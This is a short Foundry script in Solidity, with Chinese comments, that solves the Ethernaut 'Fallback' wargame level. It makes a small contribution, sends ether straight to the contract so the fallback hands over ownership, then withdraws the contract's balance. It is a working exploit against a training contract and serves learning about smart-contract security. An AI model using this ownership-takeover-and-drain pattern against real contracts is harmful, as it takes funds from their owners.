// script/FallbackExploit.s.sol
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Fallback.sol";

contract FallbackExploit is Script {
    function run() external {
        // 你的钱包私钥（通过环境变量传入，勿硬编码）
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        
        // 替换为你的Ethernaut实例地址
        Fallback instance = Fallback(payable(0xa404d232Ea2C233FbA37D0B90a80A42c64DC03B5));

        vm.startBroadcast(privateKey);
        
        instance.contribute{value: 0.0005 ether}();
        (bool success, ) = address(instance).call{value: 0.0005 ether}("");
        require(success, "Fallback call failed");
        require(instance.owner() == attacker, "Not owner yet");
        instance.withdraw();
        
        vm.stopBroadcast();
    }
}